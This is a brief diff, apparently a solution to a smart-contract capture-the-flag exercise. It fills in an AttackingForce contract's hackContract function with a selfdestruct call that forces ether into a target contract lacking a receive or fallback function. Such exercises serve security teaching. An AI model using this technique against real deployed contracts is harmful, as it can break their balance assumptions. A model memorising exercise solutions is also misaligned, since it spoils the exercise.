@@ -10,6 +10,7 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        // selfdestruct is a primative that bypasses fallback/receive
+        selfdestruct(payable(contractAddress));
     }
 }
